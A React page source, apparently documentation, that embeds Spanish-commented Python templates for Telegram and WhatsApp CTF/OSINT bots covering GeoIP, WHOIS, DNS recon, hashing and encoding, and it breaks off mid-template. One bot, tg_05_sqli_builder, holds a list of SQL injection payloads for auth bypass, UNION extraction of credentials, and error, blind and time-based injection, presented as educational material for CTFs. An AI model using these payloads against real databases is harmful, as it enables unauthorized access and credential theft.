import { useState } from "react";
import { Layout } from "@/components/layout";
import { CodeBlock } from "@/components/code-block";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { useLanguage } from "@/context/language";
import { ShieldAlert, Bot, MessageSquare, Search, Share2 } from "lucide-react";

const M = (lang: string, es: string, en: string) => lang === "es" ? es : en;

// ─────────────────────────────────────────────────────────────────────────────
// MÓDULOS COMPARTIDOS (bots/shared/)
// ─────────────────────────────────────────────────────────────────────────────

const SHARED_ENV_PY = `# bots/shared/env.py
# ╔══════════════════════════════════════════════════════════════╗
# ║  Desarrollado por: Replit (Rocio) — IA Asistente             ║
# ║  Dueño del código: Juan Alberti                              ║
# ║  Repositorio: https://github.com/AlbertiJ/Replit-bot         ║
# ╚══════════════════════════════════════════════════════════════╝
"""
Módulo compartido de variables de entorno.
Uso: from bots.shared.env import require_env
"""
import os
from dotenv import load_dotenv

# MODIFICAR: ajusta la ruta del .env si tu proyecto tiene otra estructura
load_dotenv()

def require_env(name: str) -> str:
    """
    Obtiene una variable de entorno. Si no existe, lanza un error claro.
    Nunca hardcodees claves — siempre usá esta función.
    """
    value = os.getenv(name)
    if not value:
        raise EnvironmentError(
            f"Variable de entorno requerida no encontrada: '{name}'\\n"
            f"Agregala a tu archivo .env o a los Secrets de Replit.\\n"
            f"Ejemplo en .env: {name}=tu_valor_aqui"
        )
    return value

def get_env(name: str, default: str = "") -> str:
    """Obtiene una variable de entorno con valor por defecto (opcional)."""
    return os.getenv(name, default)
`;

const SHARED_LOGGER_PY = `# bots/shared/logger.py
# ╔══════════════════════════════════════════════════════════════╗
# ║  Desarrollado por: Replit (Rocio) — IA Asistente             ║
# ║  Dueño del código: Juan Alberti                              ║
# ║  Repositorio: https://github.com/AlbertiJ/Replit-bot         ║
# ╚══════════════════════════════════════════════════════════════╝
"""
Módulo compartido de logging.
Uso: from bots.shared.logger import get_logger
"""
import logging
import sys

# MODIFICAR: cambia el nivel de logging según el entorno (DEBUG en dev, INFO en prod)
DEFAULT_LEVEL = logging.INFO
FORMAT = "%(asctime)s [%(levelname)s] %(name)s: %(message)s"

def get_logger(name: str, level: int = DEFAULT_LEVEL) -> logging.Logger:
    """
    Retorna un logger configurado y listo para usar.
    Ejemplo: logger = get_logger(__name__)
    """
    logger = logging.getLogger(name)
    if not logger.handlers:
        handler = logging.StreamHandler(sys.stdout)
        handler.setFormatter(logging.Formatter(FORMAT))
        logger.addHandler(handler)
    logger.setLevel(level)
    return logger
`;

const SHARED_INIT_PY = `# bots/shared/__init__.py
# Marca la carpeta como paquete Python.
# No modifiques este archivo — es requerido para los imports relativos.
`;

const BOTS_INIT_PY = `# bots/__init__.py
# Marca la carpeta como paquete Python raíz.
# Requerido para ejecutar con: python -m bots.ctf.nombre
`;

// ─────────────────────────────────────────────────────────────────────────────
// TELEGRAM — 5 PLANTILLAS CTF/OSINT
// ─────────────────────────────────────────────────────────────────────────────

const TG_01 = `# bots/ctf/tg_01_ip_geo_whois.py
# ╔══════════════════════════════════════════════════════════════╗
# ║  DISCLAIMER ÉTICO — Solo uso educativo y entornos autorizados║
# ║  Desarrollado por: Replit (Rocio) — IA Asistente             ║
# ║  Dueño del código: Juan Alberti                              ║
# ║  Repositorio: https://github.com/AlbertiJ/Replit-bot         ║
# ╚══════════════════════════════════════════════════════════════╝
# ─────────────────────────────────────────────────────────────
# PROPÓSITO: Bot Telegram — IP Lookup + GeoIP + WHOIS
# Ejecución: python bots/ctf/tg_01_ip_geo_whois.py
#         o: python -m bots.ctf.tg_01_ip_geo_whois
# ─────────────────────────────────────────────────────────────
# IDEA FUTURA: agregar mapa interactivo con coordenadas del IP
# IDEA FUTURA: caché de consultas para evitar rate limits

import requests
import whois
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from bots.shared.env import require_env
from bots.shared.logger import get_logger

logger = get_logger(__name__)
# MODIFICAR: nombre de la variable en tu .env o Secrets de Replit
TOKEN = require_env("TELEGRAM_BOT_TOKEN")

DISCLAIMER = (
    "⚠️ Solo para uso educativo, CTF y auditorías en entornos autorizados.\\n"
    "Nunca uses esto contra sistemas sin permiso explícito del propietario."
)


def lookup_ip(target: str) -> str:
    """Consulta GeoIP usando ip-api.com (gratuito, sin clave)."""
    try:
        # MODIFICAR: podés usar ipinfo.io con API key para más datos
        r = requests.get(f"http://ip-api.com/json/{target}?fields=status,message,country,regionName,city,isp,org,as,query", timeout=10)
        data = r.json()
        if data.get("status") != "success":
            return f"Error: {data.get('message', 'sin respuesta')}"
        return (
            f"IP: {data['query']}\\n"
            f"País: {data['country']}\\n"
            f"Región: {data['regionName']}\\n"
            f"Ciudad: {data['city']}\\n"
            f"ISP: {data['isp']}\\n"
            f"Org: {data['org']}\\n"
            f"AS: {data['as']}"
        )
    except Exception as e:
        logger.error(f"lookup_ip error: {e}")
        return f"Error consultando IP: {e}"


def lookup_whois(domain: str) -> str:
    """WHOIS de un dominio. IDEA FUTURA: parsear fechas de expiración."""
    try:
        w = whois.whois(domain)
        created = str(w.creation_date)[:10] if w.creation_date else "N/D"
        expires = str(w.expiration_date)[:10] if w.expiration_date else "N/D"
        registrar = w.registrar or "N/D"
        nameservers = ", ".join(w.name_servers[:3]) if w.name_servers else "N/D"
        return (
            f"Dominio: {domain}\\n"
            f"Registrar: {registrar}\\n"
            f"Creado: {created}\\n"
            f"Expira: {expires}\\n"
            f"NS: {nameservers}"
        )
    except Exception as e:
        logger.error(f"lookup_whois error: {e}")
        return f"Error en WHOIS: {e}"


async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Bot CTF/OSINT — IP Lookup + WHOIS\\n\\n"
        "/ip <ip_o_dominio>    — GeoIP lookup\\n"
        "/whois <dominio>      — WHOIS del dominio\\n\\n"
        + DISCLAIMER
    )


async def ip_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text("Uso: /ip <ip_o_dominio>")
        return
    target = ctx.args[0]
    logger.info(f"IP lookup: {target}")
    result = lookup_ip(target)
    await update.message.reply_text(f"GeoIP — {target}\\n\\n{result}")


async def whois_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text("Uso: /whois <dominio>")
        return
    domain = ctx.args[0]
    logger.info(f"WHOIS: {domain}")
    result = lookup_whois(domain)
    await update.message.reply_text(f"WHOIS — {domain}\\n\\n{result}")


def main():
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("ip", ip_cmd))
    app.add_handler(CommandHandler("whois", whois_cmd))
    logger.info("Bot IP/WHOIS iniciado.")
    app.run_polling()


if __name__ == "__main__":
    main()
`;

const TG_02 = `# bots/ctf/tg_02_dns_recon.py
# ╔══════════════════════════════════════════════════════════════╗
# ║  DISCLAIMER ÉTICO — Solo uso educativo y entornos autorizados║
# ║  Desarrollado por: Replit (Rocio) — IA Asistente             ║
# ║  Dueño del código: Juan Alberti                              ║
# ║  Repositorio: https://github.com/AlbertiJ/Replit-bot         ║
# ╚══════════════════════════════════════════════════════════════╝
# ─────────────────────────────────────────────────────────────
# PROPÓSITO: Bot Telegram — DNS Recon completo (A, MX, NS, TXT, CNAME)
# Ejecución: python bots/ctf/tg_02_dns_recon.py
#         o: python -m bots.ctf.tg_02_dns_recon
# IDEA FUTURA: detección de subdominios con wordlist configurable
# IDEA FUTURA: comparar DNS con histórico (detectar cambios)
# ─────────────────────────────────────────────────────────────

import dns.resolver
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from bots.shared.env import require_env
from bots.shared.logger import get_logger

logger = get_logger(__name__)
TOKEN = require_env("TELEGRAM_BOT_TOKEN")  # MODIFICAR: nombre en tu .env

RECORD_TYPES = ["A", "AAAA", "MX", "NS", "TXT", "CNAME", "SOA"]


def resolve_records(domain: str, rtype: str) -> list[str]:
    """Resuelve un tipo de registro DNS."""
    try:
        answers = dns.resolver.resolve(domain, rtype, lifetime=8)
        return [str(r) for r in answers]
    except dns.resolver.NoAnswer:
        return []
    except dns.resolver.NXDOMAIN:
        return ["NXDOMAIN — dominio no encontrado"]
    except Exception as e:
        return [f"Error: {e}"]


def full_recon(domain: str) -> str:
    """Recon DNS completo de un dominio."""
    lines = [f"DNS Recon — {domain}\\n"]
    for rtype in RECORD_TYPES:
        records = resolve_records(domain, rtype)
        if records:
            lines.append(f"[{rtype}]")
            for r in records[:5]:  # MODIFICAR: límite de resultados por tipo
                lines.append(f"  {r}")
    return "\\n".join(lines) if len(lines) > 1 else f"Sin registros DNS para {domain}"


async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Bot DNS Recon\\n\\n"
        "/dns <dominio>        — Recon completo\\n"
        "/a <dominio>          — Solo registros A\\n"
        "/mx <dominio>         — Registros MX (email)\\n"
        "/txt <dominio>        — Registros TXT\\n\\n"
        "⚠️ Solo entornos autorizados."
    )


async def dns_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text("Uso: /dns <dominio>")
        return
    domain = ctx.args[0]
    logger.info(f"DNS full recon: {domain}")
    await update.message.reply_text(full_recon(domain)[:4000])


async def record_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Handler genérico por tipo de registro. MODIFICAR: agregar más tipos."""
    if not ctx.args:
        await update.message.reply_text(f"Uso: /{ctx.command} <dominio>")
        return
    domain = ctx.args[0]
    rtype = ctx.command.upper()
    records = resolve_records(domain, rtype)
    result = f"[{rtype}] {domain}\\n" + ("\\n".join(records) or "Sin resultados")
    await update.message.reply_text(result)


def main():
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("dns", dns_cmd))
    # MODIFICAR: agregá o quitá tipos de registro según necesites
    for rtype in ["a", "mx", "txt", "ns", "cname"]:
        app.add_handler(CommandHandler(rtype, record_cmd))
    logger.info("Bot DNS Recon iniciado.")
    app.run_polling()


if __name__ == "__main__":
    main()
`;

const TG_03 = `# bots/ctf/tg_03_hash_suite.py
# ╔══════════════════════════════════════════════════════════════╗
# ║  DISCLAIMER ÉTICO — Solo uso educativo y entornos autorizados║
# ║  Desarrollado por: Replit (Rocio) — IA Asistente             ║
# ║  Dueño del código: Juan Alberti                              ║
# ║  Repositorio: https://github.com/AlbertiJ/Replit-bot         ║
# ╚══════════════════════════════════════════════════════════════╝
# ─────────────────────────────────────────────────────────────
# PROPÓSITO: Bot Telegram — Hash Suite (generar + identificar + verificar)
# Ejecución: python bots/ctf/tg_03_hash_suite.py
#         o: python -m bots.ctf.tg_03_hash_suite
# IDEA FUTURA: integrar con haveibeenpwned.com para verificar leaks
# IDEA FUTURA: diccionario offline de hashes comunes (rainbow table)
# ─────────────────────────────────────────────────────────────

import hashlib
import re
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from bots.shared.env import require_env
from bots.shared.logger import get_logger

logger = get_logger(__name__)
TOKEN = require_env("TELEGRAM_BOT_TOKEN")  # MODIFICAR: nombre en tu .env


def all_hashes(text: str) -> dict:
    """Genera todos los hashes comunes de un texto."""
    encoded = text.encode("utf-8")
    return {
        "MD5":    hashlib.md5(encoded).hexdigest(),
        "SHA1":   hashlib.sha1(encoded).hexdigest(),
        "SHA256": hashlib.sha256(encoded).hexdigest(),
        "SHA512": hashlib.sha512(encoded).hexdigest(),
        "SHA3-256": hashlib.sha3_256(encoded).hexdigest(),
        # MODIFICAR: agregar más algoritmos según necesidad del CTF
    }


def identify_hash(h: str) -> str:
    """Identifica el tipo de hash por longitud y caracteres."""
    h = h.strip()
    if not re.match(r'^[a-fA-F0-9]+$', h):
        return "No parece un hash hexadecimal"
    length_map = {
        32: "MD5 (o MD4, LM)",
        40: "SHA-1 (o MySQL4, Ripemd-160)",
        56: "SHA-224",
        64: "SHA-256 (o Keccak-256)",
        96: "SHA-384",
        128: "SHA-512 (o Whirlpool)",
    }
    return length_map.get(len(h), f"Hash desconocido ({len(h)} chars)")


async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Bot Hash Suite\\n\\n"
        "/hash <texto>         — Todos los hashes\\n"
        "/md5 <texto>          — Solo MD5\\n"
        "/sha256 <texto>       — Solo SHA-256\\n"
        "/identify <hash>      — Identificar tipo\\n\\n"
        "⚠️ Solo uso educativo y CTF autorizado."
    )


async def hash_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text("Uso: /hash <texto>")
        return
    text = " ".join(ctx.args)
    hashes = all_hashes(text)
    lines = [f"Hashes de: {text[:40]}...\\n" if len(text) > 40 else f"Hashes de: {text}\\n"]
    for name, value in hashes.items():
        lines.append(f"{name}:\\n{value}")
    await update.message.reply_text("\\n".join(lines))


async def single_hash_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """MD5 o SHA256 individual. MODIFICAR: agregar más comandos si necesitás."""
    if not ctx.args:
        await update.message.reply_text(f"Uso: /{ctx.command} <texto>")
        return
    text = " ".join(ctx.args)
    algo = ctx.command.upper().replace("SHA256", "SHA256")
    h = all_hashes(text)
    result = h.get(algo.upper()) or h.get("SHA256")
    await update.message.reply_text(f"{algo}: {result}")


async def identify_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text("Uso: /identify <hash>")
        return
    h = ctx.args[0]
    result = identify_hash(h)
    await update.message.reply_text(f"Hash: {h[:30]}...\\nTipo probable: {result}")


def main():
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("hash", hash_cmd))
    app.add_handler(CommandHandler("md5", single_hash_cmd))
    app.add_handler(CommandHandler("sha256", single_hash_cmd))
    app.add_handler(CommandHandler("identify", identify_cmd))
    logger.info("Bot Hash Suite iniciado.")
    app.run_polling()


if __name__ == "__main__":
    main()
`;

const TG_04 = `# bots/ctf/tg_04_encoding_knife.py
# ╔══════════════════════════════════════════════════════════════╗
# ║  DISCLAIMER ÉTICO — Solo uso educativo y entornos autorizados║
# ║  Desarrollado por: Replit (Rocio) — IA Asistente             ║
# ║  Dueño del código: Juan Alberti                              ║
# ║  Repositorio: https://github.com/AlbertiJ/Replit-bot         ║
# ╚══════════════════════════════════════════════════════════════╝
# ─────────────────────────────────────────────────────────────
# PROPÓSITO: Bot Telegram — Encoding Swiss Knife para CTF
#   b64, hex, ROT13, URL encode, JWT decode, Morse, Binario
# Ejecución: python bots/ctf/tg_04_encoding_knife.py
#         o: python -m bots.ctf.tg_04_encoding_knife
# IDEA FUTURA: auto-detectar el encoding de un string desconocido
# IDEA FUTURA: modo brute-force de ROT (1-25)
# ─────────────────────────────────────────────────────────────

import base64
import binascii
import codecs
import json
import urllib.parse
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from bots.shared.env import require_env
from bots.shared.logger import get_logger

logger = get_logger(__name__)
TOKEN = require_env("TELEGRAM_BOT_TOKEN")  # MODIFICAR: nombre en tu .env

# Tabla Morse — MODIFICAR: extender con caracteres especiales si necesitás
MORSE = {
    'A':'.-','B':'-...','C':'-.-.','D':'-..','E':'.','F':'..-.','G':'--.','H':'....','I':'..','J':'.---',
    'K':'-.-','L':'.-..','M':'--','N':'-.','O':'---','P':'.--.','Q':'--.-','R':'.-.','S':'...','T':'-',
    'U':'..-','V':'...-','W':'.--','X':'-..-','Y':'-.--','Z':'--..','0':'-----','1':'.----','2':'..---',
    '3':'...--','4':'....-','5':'.....','6':'-....','7':'--...','8':'---..','9':'----.',
}


def to_morse(text: str) -> str:
    return " ".join(MORSE.get(c.upper(), "?") for c in text if c != " ")


def decode_jwt_unsafe(token: str) -> dict:
    """Decodifica JWT sin verificar la firma (solo para CTF/análisis)."""
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return {"error": "No es un JWT válido (debe tener 3 partes)"}
        def _decode(segment):
            segment += "=" * (-len(segment) % 4)
            return json.loads(base64.urlsafe_b64decode(segment))
        return {"header": _decode(parts[0]), "payload": _decode(parts[1]), "sig_raw": parts[2][:20] + "..."}
    except Exception as e:
        return {"error": str(e)}


def analyze_string(text: str) -> str:
    """Auto-análisis: detecta el encoding más probable."""
    hints = []
    if len(text) % 4 == 0 and all(c in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=" for c in text):
        hints.append("Probable Base64")
    if all(c in "0123456789abcdefABCDEF" for c in text):
        hints.append(f"Probable HEX ({len(text)} chars)")
    if "." in text and text.count(".") == 2:
        hints.append("Posible JWT")
    if all(c in "01 " for c in text):
        hints.append("Posible Binario")
    if all(c in ".-/ " for c in text):
        hints.append("Posible Morse")
    return "\\n".join(hints) if hints else "Formato no identificado automáticamente"


async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Encoding Swiss Knife — CTF\\n\\n"
        "/b64enc <texto>  — Base64 encode\\n"
        "/b64dec <texto>  — Base64 decode\\n"
        "/hex <texto>     — Texto a HEX\\n"
        "/unhex <hex>     — HEX a texto\\n"
        "/rot13 <texto>   — ROT13\\n"
        "/url <texto>     — URL encode\\n"
        "/unurl <texto>   — URL decode\\n"
        "/jwt <token>     — Decodificar JWT\\n"
        "/morse <texto>   — Texto a Morse\\n"
        "/bin <texto>     — Texto a binario\\n"
        "/analyze <texto> — Auto-analizar encoding\\n\\n"
        "⚠️ Solo uso educativo y CTF."
    )


async def b64enc_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args: await update.message.reply_text("Uso: /b64enc <texto>"); return
    text = " ".join(ctx.args)
    encoded = base64.b64encode(text.encode()).decode()
    await update.message.reply_text(f"Base64:\\n{encoded}")


async def b64dec_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args: await update.message.reply_text("Uso: /b64dec <base64>"); return
    try:
        decoded = base64.b64decode(ctx.args[0]).decode("utf-8", errors="replace")
        await update.message.reply_text(f"Decodificado:\\n{decoded}")
    except Exception as e:
        await update.message.reply_text(f"Error: {e}")


async def hex_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args: await update.message.reply_text("Uso: /hex <texto>"); return
    text = " ".join(ctx.args)
    await update.message.reply_text(f"HEX:\\n{text.encode().hex()}")


async def unhex_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args: await update.message.reply_text("Uso: /unhex <hex>"); return
    try:
        decoded = bytes.fromhex(ctx.args[0]).decode("utf-8", errors="replace")
        await update.message.reply_text(f"Texto:\\n{decoded}")
    except Exception as e:
        await update.message.reply_text(f"Error: {e}")


async def rot13_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args: await update.message.reply_text("Uso: /rot13 <texto>"); return
    text = " ".join(ctx.args)
    await update.message.reply_text(f"ROT13:\\n{codecs.encode(text, 'rot_13')}")


async def url_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args: await update.message.reply_text("Uso: /url <texto>"); return
    text = " ".join(ctx.args)
    await update.message.reply_text(f"URL encoded:\\n{urllib.parse.quote(text)}")


async def unurl_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args: await update.message.reply_text("Uso: /unurl <texto>"); return
    await update.message.reply_text(f"URL decoded:\\n{urllib.parse.unquote(' '.join(ctx.args))}")


async def jwt_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args: await update.message.reply_text("Uso: /jwt <token>"); return
    result = decode_jwt_unsafe(ctx.args[0])
    await update.message.reply_text(f"JWT decodificado:\\n{json.dumps(result, indent=2, ensure_ascii=False)[:2000]}")


async def morse_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args: await update.message.reply_text("Uso: /morse <texto>"); return
    await update.message.reply_text(f"Morse:\\n{to_morse(' '.join(ctx.args))}")


async def bin_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args: await update.message.reply_text("Uso: /bin <texto>"); return
    text = " ".join(ctx.args)
    binary = " ".join(format(ord(c), "08b") for c in text)
    await update.message.reply_text(f"Binario:\\n{binary[:2000]}")


async def analyze_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args: await update.message.reply_text("Uso: /analyze <texto>"); return
    text = " ".join(ctx.args)
    result = analyze_string(text)
    await update.message.reply_text(f"Análisis de: {text[:40]}\\n\\n{result}")


def main():
    app = ApplicationBuilder().token(TOKEN).build()
    handlers = [
        ("start", start), ("b64enc", b64enc_cmd), ("b64dec", b64dec_cmd),
        ("hex", hex_cmd), ("unhex", unhex_cmd), ("rot13", rot13_cmd),
        ("url", url_cmd), ("unurl", unurl_cmd), ("jwt", jwt_cmd),
        ("morse", morse_cmd), ("bin", bin_cmd), ("analyze", analyze_cmd),
    ]
    for name, handler in handlers:
        app.add_handler(CommandHandler(name, handler))
    logger.info("Encoding Knife iniciado.")
    app.run_polling()


if __name__ == "__main__":
    main()
`;

const TG_05 = `# bots/ctf/tg_05_sqli_builder.py
# ╔══════════════════════════════════════════════════════════════╗
# ║  DISCLAIMER ÉTICO — Solo uso educativo y entornos autorizados║
# ║  Desarrollado por: Replit (Rocio) — IA Asistente             ║
# ║  Dueño del código: Juan Alberti                              ║
# ║  Repositorio: https://github.com/AlbertiJ/Replit-bot         ║
# ╚══════════════════════════════════════════════════════════════╝
# ─────────────────────────────────────────────────────────────
# PROPÓSITO: Bot Telegram — SQL Injection Payload Builder (CTF)
#   Payloads organizados por técnica para CTF y auditorías éticas
# Ejecución: python bots/ctf/tg_05_sqli_builder.py
#         o: python -m bots.ctf.tg_05_sqli_builder
# IDEA FUTURA: generador dinámico según DB target (MySQL, MSSQL, Postgres)
# IDEA FUTURA: modo interactivo para construir payloads paso a paso
# ─────────────────────────────────────────────────────────────

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes
from bots.shared.env import require_env
from bots.shared.logger import get_logger

logger = get_logger(__name__)
TOKEN = require_env("TELEGRAM_BOT_TOKEN")  # MODIFICAR: nombre en tu .env

DISCLAIMER = "⚠️ USO ÉTICO OBLIGATORIO — Solo CTF y entornos con permiso escrito."

# MODIFICAR: agregar, quitar o adaptar payloads según el CTF que estés resolviendo
PAYLOADS = {
    "auth_bypass": {
        "label": "🔓 Auth Bypass",
        "payloads": [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR 1=1 --",
            "admin'--",
            "' OR 1=1#",
            "') OR ('1'='1",
            "\" OR \"1\"=\"1",
        ]
    },
    "union_based": {
        "label": "🔗 UNION Based",
        "payloads": [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "' UNION SELECT username,password FROM users--",
            "' UNION ALL SELECT table_name,NULL FROM information_schema.tables--",
        ]
    },
    "error_based": {
        "label": "💥 Error Based",
        "payloads": [
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
            "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
            "1 AND exp(~(SELECT * FROM (SELECT user())x))--",
        ]
    },
    "boolean_blind": {
        "label": "🔍 Boolean Blind",
        "payloads": [
            "' AND 1=1--",
            "' AND 1=2--",
            "' AND SUBSTRING(username,1,1)='a'--",
            "' AND (SELECT COUNT(*) FROM users)>0--",
            "1' AND (SELECT SLEEP(0))='0",
        ]
    },
    "time_based": {
        "label": "⏱️ Time Based",
        "payloads": [
            "'; IF (1=1) WAITFOR DELAY '0:0:5'--",
            "' AND SLEEP(5)--",
            "'; SELECT pg_sleep(5)--",
            "1; WAITFOR DELAY '0:0:5'--",
        ]
    },
}


async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton(v["label"], callback_data=k)]
        for k, v in PAYLOADS.items()
    ]
    await update.message.reply_text(
        f"SQL Injection Payload Builder — CTF\\n\\n{DISCLAIMER}\\n\\nElegí una técnica:",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )


async def callback_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    cat = query.data
    if cat not in PAYLOADS:
        await query.edit_message_text("Categoría no encontrada.")
        return
    data = PAYLOADS[cat]
    payloads_text = "\\n".join(f"{i+1}. {p}" for i, p in enumerate(data["payloads"]))
    # MODIFICAR: podés agregar un botón "Ver más" para cargar payloads adicionales
    await query.edit_message_text(
        f"{data['label']}\\n\\n{payloads_text}\\n\\n{DISCLAIMER}"
    )


async def sqli_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Lista todos los payloads de una categoría por comando."""
    if not ctx.args:
        cats = " | ".join(PAYLOADS.keys())
        await update.message.reply_text(f"Uso: /sqli <categoria>\\nCategorías: {cats}")
        return
    cat = ctx.args[0].lower()
    if cat not in PAYLOADS:
        await update.message.reply_text(f"Categoría no encontrada: {cat}")
        return
    data = PAYLOADS[cat]
    payloads_text = "\\n".join(f"{i+1}. {p}" for i, p in enumerate(data["payloads"]))
    await update.message.reply_text(f"{data['label']}\\n\\n{payloads_text}\\n\\n{DISCLAIMER}")


def main():
    app = ApplicationBuilder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("sqli", sqli_cmd))
    app.add_handler(CallbackQueryHandler(callback_handler))
    logger.info("Bot SQLi Builder iniciado.")
    app.run_polling()


if __name__ == "__main__":
    main()
`;

// ─────────────────────────────────────────────────────────────────────────────
// WHATSAPP — 5 PLANTILLAS CTF/OSINT
// ─────────────────────────────────────────────────────────────────────────────

const WA_01 = `# bots/ctf/wa_01_ip_geo.py
# ╔══════════════════════════════════════════════════════════════╗
# ║  DISCLAIMER ÉTICO — Solo uso educativo y entornos autorizados║
# ║  Desarrollado por: Replit (Rocio) — IA Asistente             ║
# ║  Dueño del código: Juan Alberti                              ║
# ║  Repositorio: https://github.com/AlbertiJ/Replit-bot         ║
# ╚══════════════════════════════════════════════════════════════╝
# ─────────────────────────────────────────────────────────────
# PROPÓSITO: Bot WhatsApp — IP Lookup + GeoIP (Flask + Twilio)
# Ejecución: python bots/ctf/wa_01_ip_geo.py
#         o: python -m bots.ctf.wa_01_ip_geo
# IDEA FUTURA: agregar lookup de ASN y detección de VPN/proxy/Tor
# ─────────────────────────────────────────────────────────────

import requests
from flask import Flask, request
from twilio.twiml.messaging_response import MessagingResponse
from bots.shared.env import require_env, get_env
from bots.shared.logger import get_logger

logger = get_logger(__name__)
# MODIFICAR: puerto del servidor Flask
PORT = int(get_env("PORT", "5000"))

app = Flask(__name__)


def lookup_ip(target: str) -> str:
    """Consulta GeoIP. MODIFICAR: reemplazá por ipinfo.io si necesitás más datos."""
    try:
        r = requests.get(
            f"http://ip-api.com/json/{target}?fields=status,message,country,regionName,city,isp,query",
            timeout=10
        )
        data = r.json()
        if data.get("status") != "success":
            return f"Error: {data.get('message', 'sin respuesta')}"
        return (
            f"IP: {data['query']}\\n"
            f"País: {data['country']}\\n"
            f"Región: {data['regionName']}\\n"
            f"Ciudad: {data['city']}\\n"
            f"ISP: {data['isp']}"
        )
    except Exception as e:
        logger.error(f"lookup_ip error: {e}")
        return f"Error: {e}"


@app.route("/whatsapp", methods=["POST"])
def webhook():
    """
    Webhook principal.
    MODIFICAR: la URL debe coincidir con la configurada en Twilio Sandbox.
    """
    body = request.values.get("Body", "").strip().lower()
    resp = MessagingResponse()
    msg = resp.message()

    parts = body.split(" ", 1)
    cmd, arg = parts[0], parts[1] if len(parts) > 1 else ""

    if cmd in ("menu", "inicio", "start"):
        msg.body(
            "Bot IP/GeoIP — WhatsApp\\n\\n"
            "ip <target>  — IP Lookup\\n\\n"
            "⚠️ Solo uso educativo y CTF autorizado."
        )
    elif cmd == "ip" and arg:
        logger.info(f"IP lookup: {arg}")
        msg.body(lookup_ip(arg))
    else:
        msg.body("Enviá 'menu' para ver los comandos.")

    return str(resp)


def main():
    logger.info(f"Bot IP/GeoIP WhatsApp iniciado en puerto {PORT}...")
    # MODIFICAR: debug=False en producción siempre
    app.run(host="0.0.0.0", port=PORT, debug=False)


if __name__ == "__main__":
    main()
`;

const WA_02 = `# bots/ctf/wa_02_headers_tech.py
# ╔══════════════════════════════════════════════════════════════╗
# ║  DISCLAIMER ÉTICO — Solo uso educativo y entornos autorizados║
# ║  Desarrollado por: Replit (Rocio) — IA Asistente             ║
# ║  Dueño del código: Juan Alberti                              ║
# ║  Repositorio: https://github.com/AlbertiJ/Replit-bot         ║
# ╚══════════════════════════════════════════════════════════════╝
# ─────────────────────────────────────────────────────────────
# PROPÓSITO: Bot WhatsApp — HTTP Headers Inspector + Tech Fingerprinting
# Ejecución: python bots/ctf/wa_02_headers_tech.py
#         o: python -m bots.ctf.wa_02_headers_tech
# IDEA FUTURA: puntuar seguridad de las cabeceras (A-F score)
# IDEA FUTURA: detectar WAF (Cloudflare, Akamai, ModSecurity)
# ─────────────────────────────────────────────────────────────

import requests
from flask import Flask, request
from twilio.twiml.messaging_response import MessagingResponse
from bots.shared.env import get_env
from bots.shared.logger import get_logger

logger = get_logger(__name__)
PORT = int(get_env("PORT", "5000"))
app = Flask(__name__)

# MODIFICAR: agregar más indicadores de tecnología según necesidad del CTF
TECH_SIGNATURES = {
    "server": {
